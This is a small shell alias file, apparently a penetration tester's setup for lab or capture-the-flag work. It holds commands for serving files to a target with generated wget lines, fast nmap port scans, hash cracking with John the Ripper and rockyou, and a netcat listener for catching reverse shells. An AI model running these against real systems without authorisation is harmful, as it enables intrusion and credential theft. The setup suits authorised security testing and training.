#find public ip
alias myip='curl ipinfo.io/ip'

#starts python web server on port 80 and prints out the wget command to download any file in the current working directory
alias lweb='ip=$(ip a s tun0 | grep -oP "(\d{2}\.){3}\d{1,2}") && for i in $(ls Downloads); do echo "wget $ip/$i"; done; python3 -m http.server 80'

#fast nmap full port scan. Usage: qscan 'yourip'
qscan () { nmap -p- --min-rate 5000 --max-retries 2 -n -Pn "$1" }

#run jtr with rockyou. Usage: j 'hash'
j () {john "$1" --wordlist=rockyou.txt}

#start netcat listen to receive reverse shell. Usage: listen 'port'
listen () {nc -nvlp "$1"}
